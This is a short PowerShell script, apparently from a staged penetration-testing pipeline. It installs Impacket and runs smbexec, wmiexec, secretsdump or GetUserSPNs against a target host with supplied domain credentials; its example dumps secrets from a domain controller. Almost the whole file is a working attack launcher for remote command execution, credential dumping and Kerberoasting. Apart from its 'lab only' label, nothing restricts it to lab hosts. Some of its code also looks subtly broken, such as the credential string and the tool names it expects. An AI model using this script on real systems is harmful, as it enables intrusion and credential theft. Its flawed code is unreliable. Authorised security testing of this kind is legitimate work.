<#
.SYNOPSIS
    Stage 5 lab-only re-attack validator (Impacket).
.DESCRIPTION
    Runs a specific Impacket technique against a lab target to prove a path
    that Stage 2 identified is (or is not) exploitable. For lab use only.
.PARAMETER Technique
    One of: smbexec, wmiexec, secretsdump, getuserspns
.PARAMETER Target
    Target host FQDN or IP.
.PARAMETER Username / Domain / Password
    Credentials for the principal under test.
.EXAMPLE
    .\Stage5-ReAttack.ps1 -Technique secretsdump -Target dc01.lab.local `
        -Username svc.backup -Domain LAB -Password 'ChangeMe!2024'
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)][ValidateSet("smbexec","wmiexec","secretsdump","getuserspns")]
    [string]$Technique,
    [Parameter(Mandatory=$true)][string]$Target,
    [Parameter(Mandatory=$true)][string]$Username,
    [Parameter(Mandatory=$true)][string]$Domain,
    [Parameter(Mandatory=$true)][string]$Password,
    [string]$Python = "python"
)
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# Impacket install (pip). Safe to re-run.
try { & $Python -c "import impacket" } catch {
    Write-Host "Installing impacket ..."
    & $Python -m pip install impacket
}

$scriptMap = @{
    "smbexec"     = "impacket-smbexec"
    "wmiexec"     = "impacket-wmiexec"
    "secretsdump" = "impacket-secretsdump"
    "getuserspns" = "impacket-GetUserSPNs"
}
$cmd = $scriptMap[$Technique]
$argString = "$Domain/$Username:$Password@$Target"
Write-Host "Running $cmd $argString"
& $cmd $argString
Write-Host "Record exit code for before/after comparison."
